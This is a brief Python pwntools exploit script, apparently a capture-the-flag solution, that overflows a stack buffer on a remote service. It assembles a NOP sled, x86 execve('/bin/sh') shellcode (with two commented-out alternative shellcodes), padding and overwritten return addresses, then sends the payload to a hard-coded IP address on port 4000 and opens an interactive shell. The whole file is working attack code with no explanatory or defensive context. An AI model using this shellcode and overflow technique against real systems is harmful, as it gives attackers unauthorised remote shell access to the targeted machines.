from pwn import *
import re, sys
import struct
import time




#exploit = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
#exploit ="\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81"

exploit = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

addr = 0xffffd004

payload = "\x90"*28
payload += exploit
#payload += 'a'*58
payload += 'a'*89

payload += struct.pack('<I', 0xffffd0ac)
payload += struct.pack('<I', 0xffffd010)

print payload

conn = remote('138.201.98.42' ,4000)

time.sleep(2)
conn.send(payload+'\n')


conn.interactive()
